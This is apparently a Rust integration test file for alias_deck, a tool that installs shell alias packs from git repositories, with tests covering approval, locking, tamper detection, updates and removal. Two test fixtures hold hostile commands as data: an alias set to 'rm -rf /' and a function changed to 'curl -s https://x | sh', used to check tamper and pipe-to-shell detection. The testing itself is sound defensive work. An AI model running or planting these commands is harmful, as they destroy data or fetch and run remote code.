//! The IO library against a temp HOME and git fixture repositories.

mod common;

use std::fs;

use alias_deck::{approve, build, check_update, context, fetch, list, load_installed, remove, Error, UpdateCheck};
use alias_deck_core::{Rule, Shell, Source};
use common::{pack, World};

const BODY: &str = "[groups.g.aliases]\nhello = \"echo hello\"\n[groups.g.functions.greet]\nscript = 'echo hi'\n";

fn src(s: &str) -> Source {
    Source::parse_with_ref(s).unwrap()
}

#[test]
fn approving_a_git_pack_writes_store_lock_manifest_and_all_four_init_files() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    let cand = fetch(&w.paths, &src(&World::source(&repo, "p.toml"))).unwrap();
    assert!(!w.paths.manifest().exists(), "fetch writes nothing");
    approve(&w.paths, &cand).unwrap();

    let installed = load_installed(&w.paths).unwrap();
    let locked = installed.lock.get(&cand.source).unwrap();
    assert_eq!(locked.commit.as_str(), w.git(&repo, &["rev-parse", "HEAD"]).trim());
    assert_eq!(fs::read_to_string(w.paths.store_pack(&locked.sha256)).unwrap(), pack("demo", BODY));
    assert_eq!(installed.manifest.packs().len(), 1);
    for shell in Shell::ALL {
        let init = fs::read_to_string(w.paths.init(shell)).unwrap();
        assert!(init.contains("hello"), "{shell} init defines the alias");
    }
}

#[test]
fn build_twice_writes_identical_bytes() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    approve(&w.paths, &fetch(&w.paths, &src(&World::source(&repo, "p.toml"))).unwrap()).unwrap();
    let first: Vec<Vec<u8>> = Shell::ALL.iter().map(|s| fs::read(w.paths.init(*s)).unwrap()).collect();
    build(&w.paths).unwrap();
    let second: Vec<Vec<u8>> = Shell::ALL.iter().map(|s| fs::read(w.paths.init(*s)).unwrap()).collect();
    assert_eq!(first, second);
}

#[test]
fn a_tampered_store_file_fails_the_build_and_keeps_the_last_good_init_files() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    let cand = fetch(&w.paths, &src(&World::source(&repo, "p.toml"))).unwrap();
    approve(&w.paths, &cand).unwrap();
    let good = fs::read(w.paths.init(Shell::Zsh)).unwrap();

    fs::write(w.paths.store_pack(&cand.sha256), pack("demo", "[groups.g.aliases]\nhello = \"rm -rf /\"\n")).unwrap();
    let err = build(&w.paths).unwrap_err();
    let Error::Packs(failures) = &err else { panic!("expected a pack failure, got {err}") };
    assert!(matches!(failures[..], [(_, Error::Tampered { .. })]), "{err}");
    assert_eq!(fs::read(w.paths.init(Shell::Zsh)).unwrap(), good, "the last good init file stays");
}

#[test]
fn a_local_pack_is_read_live_at_every_build() {
    let w = World::new();
    let file = w.paths.home.join("mine.toml");
    fs::write(&file, pack("mine", "[groups.g.aliases]\nll = \"ls -l\"\n")).unwrap();
    approve(&w.paths, &fetch(&w.paths, &src("~/mine.toml")).unwrap()).unwrap();
    assert!(load_installed(&w.paths).unwrap().lock.packs().is_empty(), "local packs are not locked");

    fs::write(&file, pack("mine", "[groups.g.aliases]\nla = \"ls -a\"\n")).unwrap();
    build(&w.paths).unwrap();
    let init = fs::read_to_string(w.paths.init(Shell::Bash)).unwrap();
    assert!(init.contains("alias la='ls -a'") && !init.contains("ls -l"), "{init}");
}

#[test]
fn update_reports_new_bytes_against_the_approved_ones() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    approve(&w.paths, &fetch(&w.paths, &src(&World::source(&repo, "p.toml"))).unwrap()).unwrap();
    let installed = load_installed(&w.paths).unwrap();
    let mp = &installed.manifest.packs()[0];
    assert!(matches!(check_update(&w.paths, &installed, mp).unwrap(), UpdateCheck::UpToDate));

    w.commit(&repo, &[("README", "same pack, new commit")], "docs");
    assert!(matches!(check_update(&w.paths, &installed, mp).unwrap(), UpdateCheck::UpToDate), "same bytes");

    w.commit(&repo, &[("p.toml", &pack("demo", &BODY.replace("echo hi", "curl -s https://x | sh")))], "evil");
    let UpdateCheck::Changed { old: Some(old), new } = check_update(&w.paths, &installed, mp).unwrap() else {
        panic!("expected a change")
    };
    let diff = alias_deck_core::diff_packs(old.pack(), new.doc.pack());
    assert_eq!(diff.changes.len(), 1);
    assert!(diff.new_findings.iter().any(|f| f.rule == Rule::BodyPipeToShell));
    assert_eq!(load_installed(&w.paths).unwrap().lock, installed.lock, "checking writes nothing");
}

#[test]
fn a_ref_pins_a_tag_and_a_missing_ref_is_an_error() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    let v1 = w.git(&repo, &["rev-parse", "HEAD"]).trim().to_owned();
    w.git(&repo, &["tag", "-a", "v1", "-m", "v1"]);
    w.commit(&repo, &[("p.toml", &pack("demo", "[groups.g.aliases]\nnewer = \"ls\"\n"))], "next");
    let cand = fetch(&w.paths, &src(&format!("{}@v1", World::source(&repo, "p.toml")))).unwrap();
    assert_eq!(cand.commit.unwrap().as_str(), v1, "an annotated tag resolves to its commit");
    assert_eq!(cand.text, pack("demo", BODY));
    let err = fetch(&w.paths, &src(&format!("{}@nope", World::source(&repo, "p.toml")))).err().unwrap();
    assert!(err.to_string().contains("no branch or tag named `nope`"), "{err}");
}

#[test]
fn context_reports_clashes_and_refuses_a_second_pack_with_the_same_name() {
    let w = World::new();
    let a = w.repo("a", &[("p.toml", &pack("shared", "[groups.g.aliases]\ngs = \"git status\"\n"))]);
    approve(&w.paths, &fetch(&w.paths, &src(&World::source(&a, "p.toml"))).unwrap()).unwrap();
    let b = w.repo("b", &[("p.toml", &pack("mine", "[groups.g.aliases]\ngs = \"git status -sb\"\n"))]);
    let cand = fetch(&w.paths, &src(&World::source(&b, "p.toml"))).unwrap();
    let ctx = context(&w.paths, &load_installed(&w.paths).unwrap(), &cand).unwrap();
    assert_eq!(ctx.clashes.len(), 1);
    assert_eq!((ctx.clashes[0].other.as_str(), ctx.clashes[0].winner.as_str()), ("shared", "mine"));

    let c = w.repo("c", &[("p.toml", &pack("shared", ""))]);
    let dup = fetch(&w.paths, &src(&World::source(&c, "p.toml"))).unwrap();
    let err = context(&w.paths, &load_installed(&w.paths).unwrap(), &dup).err().unwrap();
    assert!(matches!(err, Error::NameTaken { .. }), "{err}");
}

#[test]
fn remove_by_name_drops_manifest_and_lock_entries_and_rebuilds() {
    let w = World::new();
    let repo = w.repo("r", &[("p.toml", &pack("demo", BODY))]);
    approve(&w.paths, &fetch(&w.paths, &src(&World::source(&repo, "p.toml"))).unwrap()).unwrap();
    remove(&w.paths, "demo").unwrap();
    let installed = load_installed(&w.paths).unwrap();
    assert!(installed.manifest.packs().is_empty() && installed.lock.packs().is_empty());
    assert!(!fs::read_to_string(w.paths.init(Shell::Zsh)).unwrap().contains("hello"));
    assert!(list(&w.paths).unwrap().is_empty());
    assert!(matches!(remove(&w.paths, "demo"), Err(Error::NotInDeck(_))));
}
